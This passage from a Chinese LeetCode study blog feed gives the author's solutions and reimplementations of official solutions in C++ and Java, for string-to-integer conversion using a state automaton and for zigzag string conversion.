&quot;4193&quot;；由于下一个字符不是一个数字，所以读入停止）</span><br><span class="line">             ^</span><br><span class="line">解析得到整数 4193 。</span><br><span class="line">由于 &quot;4193&quot; 在范围 [-231, 231 - 1] 内，最终结果为 4193 。</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;words and 987&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;words and 987&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line">         ^</span><br><span class="line">第 2 步：&quot;words and 987&quot;（当前没有读入字符，因为这里不存在 &#x27;-&#x27; 或者 &#x27;+&#x27;）</span><br><span class="line">         ^</span><br><span class="line">第 3 步：&quot;words and 987&quot;（由于当前字符 &#x27;w&#x27; 不是一个数字，所以读入停止）</span><br><span class="line">         ^</span><br><span class="line">解析得到整数 0 ，因为没有读入任何数字。</span><br><span class="line">由于 0 在范围 [-231, 231 - 1] 内，最终结果为 0 。</span><br></pre></td></tr></table></figure><p><strong>示例 5：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;-91283472332&quot;</span><br><span class="line">输出：-2147483648</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;-91283472332&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line">         ^</span><br><span class="line">第 2 步：&quot;-91283472332&quot;（读入 &#x27;-&#x27; 字符，所以结果应该是负数）</span><br><span class="line">          ^</span><br><span class="line">第 3 步：&quot;-91283472332&quot;（读入 &quot;91283472332&quot;）</span><br><span class="line">                     ^</span><br><span class="line">解析得到整数 -91283472332 。</span><br><span class="line">由于 -91283472332 小于范围 [-231, 231 - 1] 的下界，最终结果被截断为 -231 = -2147483648 。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= s.length &lt;= 200</code></li><li><code>s</code> 由英文字母（大写和小写）、数字（<code>0-9</code>）、<code>' '</code>、<code>'+'</code>、<code>'-'</code> 和 <code>'.'</code> 组成</li></ul><h3 id="我的答案-7">我的答案</h3><blockquote><p><strong>思路</strong></p><p>根据题目要求的步骤，先把无用的前导空格丢弃，剩下的所有字符先放进字符数组 <code>ch</code> 中，然后依次读取字符，只取第一串数字，同时注意正负号及整数范围的影响。这里全部当作正数，最后统一判断输出，简化中间计算。特别是负数的范围，由于负数比整数多一位，所以直接对 <code>INT_MIN</code> 取正会导致超出，这里使用 <code>num - 1 &gt; -(INT_MIN+1)</code> 控制负数的范围。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">char</span>&gt; <span class="title">ch</span><span class="params">(s.size() + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>, l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] != <span class="string">&#x27; &#x27;</span> || l) &#123;</span><br><span class="line">                ch[j++] = s[i];</span><br><span class="line">                l = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ch[j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> m = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(ch[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            m = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(ch[<span class="number">0</span>] == <span class="string">&#x27;+&#x27;</span>) m = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; ch[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>((m == <span class="number">0</span> || m == <span class="number">2</span>) &amp;&amp; i == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(ch[i] &lt;= <span class="string">&#x27;9&#x27;</span> &amp;&amp; ch[i] &gt;= <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                num = num * <span class="number">10</span> + (<span class="keyword">int</span>)(ch[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span>(m &amp;&amp; num &gt; INT_MAX) <span class="keyword">return</span> INT_MAX;</span><br><span class="line">                <span class="keyword">if</span>(!m &amp;&amp; num - <span class="number">1</span> &gt; -(INT_MIN+<span class="number">1</span>)) <span class="keyword">return</span> INT_MIN;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> m ? num : -num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>8 ms</strong></p></li><li><p>内存消耗: <strong>7 MB</strong></p></li></ul><h3 id="官方答案-8">官方答案</h3><p>在官方题解中，又为我们引出了新的方法：</p><h4 id="自动机">自动机</h4><blockquote><p><strong>思路</strong></p><p>字符串处理的题目往往涉及复杂的流程以及条件情况，如果直接上手写程序，一不小心就会写出极其臃肿的代码。</p><p>因此，为了有条理地分析每个输入字符的处理方法，我们可以使用自动机这个概念：</p><p>我们的程序在每个时刻有一个状态 s，每次从序列中输入一个字符 c，并根据字符 c 转移到下一个状态 s’。这样，我们只需要建立一个覆盖所有情况的从 s 与 c 映射到 s’ 的表格即可解决题目中的问题。</p><p><strong>算法</strong></p><p>本题可以建立如下图所示的自动机：</p><p><img src="fig1.png" alt="自动机图示"></p><p>我们也可以用下面的表格来表示这个自动机：</p><table><thead><tr><th style="text-align:left"></th><th style="text-align:center">’ ’</th><th style="text-align:center">+/-</th><th style="text-align:center">number</th><th style="text-align:center">other</th></tr></thead><tbody><tr><td style="text-align:left">start</td><td style="text-align:center">start</td><td style="text-align:center">signed</td><td style="text-align:center">in_number</td><td style="text-align:center">end</td></tr><tr><td style="text-align:left">signed</td><td style="text-align:center">end</td><td style="text-align:center">end</td><td style="text-align:center">in_number</td><td style="text-align:center">end</td></tr><tr><td style="text-align:left">in_number</td><td style="text-align:center">end</td><td style="text-align:center">end</td><td style="text-align:center">in_number</td><td style="text-align:center">end</td></tr><tr><td style="text-align:left">end</td><td style="text-align:center">end</td><td style="text-align:center">end</td><td style="text-align:center">end</td><td style="text-align:center">end</td></tr></tbody></table><p>接下来编程部分就非常简单了：我们只需要把上面这个状态转换表抄进代码即可。</p><p>另外自动机也需要记录当前已经输入的数字，只要在 <code>s'</code> 为 <code>in_number</code> 时，更新我们输入的数字，即可最终得到输入的数字。</p><p>作者：LeetCode-Solution</p></blockquote><p>这里用 C++ 复现了一遍：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AutoMaton</span> &#123;</span></span><br><span class="line">    string state = <span class="string">&quot;start&quot;</span>;</span><br><span class="line">    unordered_map&lt;string, vector&lt;string&gt;&gt; table = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;start&quot;</span>, &#123;<span class="string">&quot;start&quot;</span>, <span class="string">&quot;signed&quot;</span>, <span class="string">&quot;digit&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;signed&quot;</span>, &#123;<span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;digit&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;digit&quot;</span>, &#123;<span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;digit&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;end&quot;</span>, &#123;<span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCol</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isspace</span>(c)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&#x27;+&#x27;</span> || c == <span class="string">&#x27;-&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isdigit</span>(c)) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sign = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">        state = table[state][<span class="built_in">getCol</span>(c)];</span><br><span class="line">        <span class="keyword">if</span>(state == <span class="string">&quot;digit&quot;</span>) &#123;</span><br><span class="line">            ans = ans * <span class="number">10</span> + c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            ans = sign == <span class="number">1</span> ? <span class="built_in">min</span>(ans, (<span class="keyword">long</span>)INT_MAX) : <span class="built_in">min</span>(ans, -(<span class="keyword">long</span>)INT_MIN);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state == <span class="string">&quot;signed&quot;</span>) sign = c == <span class="string">&#x27;+&#x27;</span> ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        AutoMaton am;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c : s) am.<span class="built_in">get</span>(c);</span><br><span class="line">        <span class="keyword">return</span> am.sign * am.ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>16 ms</strong></p></li><li><p>内存消耗: <strong>10.5 MB</strong></p></li></ul><p>学到了学到了，这种方法确实感觉非常不赖，不过代码量还是挺大的。这里还涉及到一个小知识点：</p><blockquote><p>C++ 中的 min() 函数接收两个<strong>相同类型</strong>的参数并返回较小值</p></blockquote><p>注意，是相同类型的参数。在我编辑代码的时候就因为给 min() 的参数为 long 类型的 ans 和 int 类型的 INT_MAX ，虽然都是整数，但确实是不同的类型，这里使用 (long) 对 INT_MAX 做了强制类型转换。</p><p>老规矩，再练习一遍用 Java 来实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        AutoMoton am = <span class="keyword">new</span> AutoMoton();</span><br><span class="line">        <span class="keyword">int</span> len = s.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            am.get(s.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)am.ans * am.sign;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AutoMoton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sign = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> String state = <span class="string">&quot;start&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String[]&gt; table = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;() &#123;&#123;</span><br><span class="line">        put(<span class="string">&quot;start&quot;</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;start&quot;</span>, <span class="string">&quot;signed&quot;</span>, <span class="string">&quot;digit&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;);</span><br><span class="line">        put(<span class="string">&quot;signed&quot;</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;digit&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;);</span><br><span class="line">        put(<span class="string">&quot;digit&quot;</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;digit&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;);</span><br><span class="line">        put(<span class="string">&quot;end&quot;</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;);</span><br><span class="line">    &#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getCol</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&#x27; &#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&#x27;+&#x27;</span> || c == <span class="string">&#x27;-&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(Character.isDigit(c)) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">        state = table.get(state)[getCol(c)];</span><br><span class="line">        <span class="keyword">if</span>(state.equals(<span class="string">&quot;digit&quot;</span>)) &#123;</span><br><span class="line">            ans = ans * <span class="number">10</span> + c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            ans = sign == <span class="number">1</span> ? Math.min(ans, (<span class="keyword">long</span>)Integer.MAX_VALUE) : Math.min(ans, -(<span class="keyword">long</span>)Integer.MIN_VALUE);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state.equals(<span class="string">&quot;signed&quot;</span>)) sign = c == <span class="string">&#x27;+&#x27;</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>3 ms</strong></p></li><li><p>内存消耗: <strong>38.4 MB</strong></p></li></ul><blockquote><p><strong>总结</strong></p><p>今天做题速度依然非常慢，效率还是低了一点。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
            <tag> C++ </tag>
            
            <tag> 数学 </tag>
            
            <tag> AC算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 刷题笔记——day 5</title>
      <link href="/posts/ba005c5f/"/>
      <url>/posts/ba005c5f/</url>
      
        <content type="html"><![CDATA[<h1>LeetCode 刷题笔记——day 5</h1><h2 id="6-Z-字形变换"><a href="https://leetcode-cn.com/problems/zigzag-conversion/">6. Z 字形变换</a></h2><p>难度：中等</p><p>将一个给定字符串 <code>s</code> 根据给定的行数 <code>numRows</code> ，以从上往下、从左到右进行 Z 字形排列。</p><p>比如输入字符串为 <code>&quot;PAYPALISHIRING&quot;</code> 行数为 <code>3</code> 时，排列如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P   A   H   N</span><br><span class="line">A P L S I I G</span><br><span class="line">Y   I   R</span><br></pre></td></tr></table></figure><p>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;PAHNAPLSIIGYIR&quot;</code>。</p><p>请你实现这个将字符串进行指定行数变换的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string convert(string s, int numRows);</span><br></pre></td></tr></table></figure><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;PAYPALISHIRING&quot;, numRows = 3</span><br><span class="line">输出：&quot;PAHNAPLSIIGYIR&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;PAYPALISHIRING&quot;, numRows = 4</span><br><span class="line">输出：&quot;PINALSIGYAHRPI&quot;</span><br><span class="line">解释：</span><br><span class="line">P     I    N</span><br><span class="line">A   L S  I G</span><br><span class="line">Y A   H R</span><br><span class="line">P     I</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;A&quot;, numRows = 1</span><br><span class="line">输出：&quot;A&quot;</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= s.length &lt;= 1000</code></li><li><code>s</code> 由英文字母（小写和大写）、<code>','</code> 和 <code>'.'</code> 组成</li><li><code>1 &lt;= numRows &lt;= 1000</code></li></ul><h3 id="我的答案-5">我的答案</h3><blockquote><p><strong>思路</strong>：</p><p>首先，因为在行数大于等于字符串长度或者行数为 1 的时候，输出字符串本身即可，所以在第一步就直接判断两种情况并返回，节省程序运行时间，然后把 Z 字形字符串以第一行为界分为几个小区间，在每个小区间内遍历字符并分配到所在行数，最终把所有行字符串相加即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">convert</span><span class="params">(string s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>() &lt;= numRows || numRows == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">str</span><span class="params">(numRows)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> n = (numRows - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i += n) &#123;</span><br><span class="line">            <span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; i + j &lt; s.<span class="built_in">size</span>() &amp;&amp; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(j &lt;= n / <span class="number">2</span>) &#123;</span><br><span class="line">                    m = j;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    m--;</span><br><span class="line">                    <span class="keyword">if</span>(m == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                str[m] += s[i + j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        string s0 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">            s0 += str[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>执行用时: <strong>8 ms</strong></li><li>内存消耗: <strong>10.5 MB</strong></li></ul><h3 id="官方答案-6">官方答案</h3><p>老实说，我觉得我的解法还行，不过还是看看官方题解。官方题解里依然给出了两种方法：</p><h4 id="按行排序">按行排序</h4><blockquote><p><strong>思路</strong></p><p>通过从左向右迭代字符串，我们可以轻松地确定字符位于 Z 字形图案中的哪一行。</p><p><strong>算法</strong></p><p>我们可以使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>min</mtext><mo stretchy="false">(</mo><mtext>numRows</mtext><mo separator="true">,</mo><mtext>len</mtext><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{min}( \text{numRows}, \text{len}(s))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">min</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">numRows</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">len</span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">))</span></span></span></span> 个列表来表示 Z 字形图案中的非空行。</p><p>从左到右迭代 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>，将每个字符添加到合适的行。可以使用当前行和当前方向这两个变量对合适的行进行跟踪。</p><p>只有当我们向上移动到最上面的行或向下移动到最下面的行时，当前方向才会发生改变。</p><p>作者：LeetCode</p></blockquote><p>这里用 C++ 复现了一遍官方解法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">convert</span><span class="params">(string s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(numRows &gt;= s.<span class="built_in">size</span>() || numRows == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">str</span><span class="params">(numRows)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">bool</span> m = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c : s) &#123;</span><br><span class="line">            str[i] += c;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span> || i == numRows - <span class="number">1</span>) m = !m;</span><br><span class="line">            i += m ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        string s0;</span><br><span class="line">        <span class="keyword">for</span>(string st : str) s0 += st;</span><br><span class="line">        <span class="keyword">return</span> s0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>12 ms</strong></p></li><li><p>内存消耗: <strong>10.4 MB</strong></p></li></ul><blockquote><p>官方题解中第一步只判断输出了行数为 1 的情况，增加 <code>numRows &gt;= s.size()</code> 判断，也算是难得给官方升级一下。</p></blockquote><p>同样练习练习用 Java 来实现一遍：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span 